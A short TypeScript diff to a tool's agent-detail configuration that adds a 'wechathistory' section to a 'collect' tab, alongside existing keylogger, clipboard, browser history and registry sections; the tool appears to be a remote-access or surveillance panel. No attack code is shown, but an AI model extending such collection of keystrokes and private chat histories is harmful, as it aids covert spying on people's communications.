@@ -45,6 +45,7 @@ export type AgentDetailSection =
   | "screentrigger"
   | "registry"
   | "browserhistory"
+  | "wechathistory"
   | "keylogger"
   | "clipboard"
   | "wallpaper"
@@ -64,6 +65,7 @@ export const AGENT_DETAIL_SECTION_TABS: Record<AgentDetailSection, AgentDetailTa
   screentrigger: "collect",
   registry: "collect",
   browserhistory: "collect",
+  wechathistory: "collect",
   keylogger: "collect",
   clipboard: "collect",
   wallpaper: "collect",
@@ -86,6 +88,7 @@ export function sectionSupported(
     case "hostinfo":
     case "process":
     case "timeline":
+    case "wechathistory":
       return true;
     default:
       return false;
